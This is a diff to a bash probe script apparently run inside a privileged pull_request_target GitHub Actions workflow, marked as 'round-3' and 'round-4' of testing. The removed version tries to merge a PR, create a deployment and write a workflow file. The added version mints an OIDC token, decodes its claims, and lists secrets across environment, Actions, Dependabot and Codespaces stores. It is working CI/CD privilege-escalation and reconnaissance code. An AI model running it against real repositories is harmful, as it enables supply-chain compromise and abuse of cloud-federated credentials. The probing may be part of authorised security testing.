@@ -1,30 +1,45 @@
 #!/usr/bin/env bash
-# i10413 round-3: PR merge capability + workflow registry, inside pr-target.yml (write-all)
+# i10413 round-4: OIDC minting + environment secret surface, inside pr-target.yml (write-all)
 set +e
 T="$GITHUB_TOKEN"; R="$GITHUB_REPOSITORY"; API="https://api.github.com"
-SHA=$(jq -r '.pull_request.head.sha' "$GITHUB_EVENT_PATH" 2>/dev/null)
-echo "I10413C_START repo=$R head=$SHA run=$GITHUB_RUN_ID"
+echo "I10413D_START repo=$R run=$GITHUB_RUN_ID"
 
 api(){ m="$1"; u="$2"; shift 2; c=$(curl -s -o /tmp/b -w '%{http_code}' -X "$m" -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$u" "$@"); echo ">>> [$m] $u => $c"; head -c 700 /tmp/b | tr '\n' ' '; echo; }
 
-echo "=== locate open PR base=exp-10413-base ==="
-MPR=$(curl -s -H "Authorization: Bearer $T" "$API/repos/$R/pulls?state=open&per_page=50" | jq -r '[.[]|select(.base.ref=="exp-10413-base")][0].number')
-echo "merge_test_pr=$MPR"
-api GET "$API/repos/$R/pulls/$MPR"
-echo "--- attempt merge via app token ---"
-api PUT "$API/repos/$R/pulls/$MPR/merge" -d '{"merge_method":"merge"}'
-api GET "$API/repos/$R/pulls/$MPR"
-api GET "$API/repos/$R/git/ref/heads/exp-10413-base"
+echo "=== (c) OIDC token minting ==="
+echo "id_token_url_set=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo yes || echo no)"
+echo "id_token_req_set=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo yes || echo no)"
+if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+  curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=i10413" -o /tmp/oidc.json -w "oidc_http=%{http_code}\n"
+  python3 - <<'PY'
+import json,base64
+try:
+    d=json.load(open('/tmp/oidc.json')); t=d.get('value','')
+    print("oidc_token_len", len(t))
+    p=t.split('.')
+    if len(p)>=2:
+        pad=p[1]+'='*(-len(p[1])%4)
+        c=json.loads(base64.urlsafe_b64decode(pad))
+        print(json.dumps({k:c.get(k) for k in ['iss','sub','aud','repository','repository_owner','actor','ref','event_name','environment','job_workflow_ref','runner_environment']}, indent=1))
+except Exception as e:
+    print("oidc_err", e)
+PY
+fi
 
-echo "=== workflow registry (token knowledge) ==="
-curl -s -H "Authorization: Bearer $T" "$API/repos/$R/actions/workflows?per_page=100" -o /tmp/wf.json
-echo "wf_count=$(jq -r '.total_count' /tmp/wf.json)"
-jq -r '.workflows[] | "\(.id) \(.path) \(.state)"' /tmp/wf.json | head -40
+echo "=== (c2) environment-scoped secret metadata ==="
+for e in prod exp-10554 exp-10554-owner-StephenClash i10537-dep; do
+  api GET "$API/repos/$R/environments/$e/secrets"
+  api GET "$API/repos/$R/environments/$e"
+done
 
-echo "=== deployments full body ==="
-api POST "$API/repos/$R/deployments" -d "{\"ref\":\"$SHA\",\"environment\":\"i10413-newname\",\"description\":\"i10413 probe\"}"
+echo "=== (c3) other secret stores ==="
+api GET "$API/repos/$R/actions/secrets"
+api GET "$API/repos/$R/dependabot/secrets"
+api GET "$API/repos/$R/codespaces/secrets"
 
-echo "=== workflow file create via contents (expect 403) ==="
-CT=$(printf %s 'name: x' | base64 -w0)
-api PUT "$API/repos/$R/contents/.github/workflows/i10413-probe.yml" -d "{\"message\":\"probe\",\"content\":\"$CT\",\"branch\":\"exp-10413\"}"
-echo "I10413C_END"
+echo "=== runner/token introspection ==="
+api GET "$API/user"          # expect 403 integration
+api GET "$API/installation/repositories"
+api GET "$API/repos/$R/collaborators?per_page=5"
+
+echo "I10413D_END"
